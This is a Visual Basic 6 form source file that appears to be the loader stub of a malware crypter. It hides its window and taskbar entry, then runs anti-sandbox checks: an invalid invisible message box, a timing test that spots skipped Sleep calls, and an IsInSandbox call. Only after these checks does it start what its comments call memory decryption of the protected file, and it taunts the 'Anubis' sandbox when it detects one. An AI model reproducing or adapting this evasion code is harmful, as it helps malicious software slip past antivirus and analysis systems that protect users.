VERSION 5.00
Begin VB.Form frmMain 
   BorderStyle     =   0  'None
   ClientHeight    =   870
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   1620
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   870
   ScaleWidth      =   1620
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function GetTickCount Lib "kernel32" () As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Declare Function MessageBoxA Lib "user32.dll" (ByVal hwnd As Long, ByVal lpText As String, ByVal lpCaption As String, ByVal wType As Long) As Long

Dim starting As Long
Dim finished As Long


Private Sub Form_Load()
    'This code may look strage, but it will actually trick some sandboxes
    'that some antiviruses are using to emulate the protected file
    
    If MessageBoxA(-1, 0, 0, 3) = 0 Then 'This creates an invisble messagebox
        Me.Hide
        App.TaskVisible = False
        
        'When some sandboxes detect that the sleep-API has been called, they simply skip it
        'So when can easily check if the sleep was skipped
        starting = GetTickCount
        Sleep 200
        finished = GetTickCount
        
        'If the sleep-API wasn't skipped, then start the memory decryption
        If (finished - starting) > 100 Then
            If IsInSandbox = True Then End
            Call start
        Else
            MsgBox "HI ANUBIS": End
        End If
    End If
End Sub
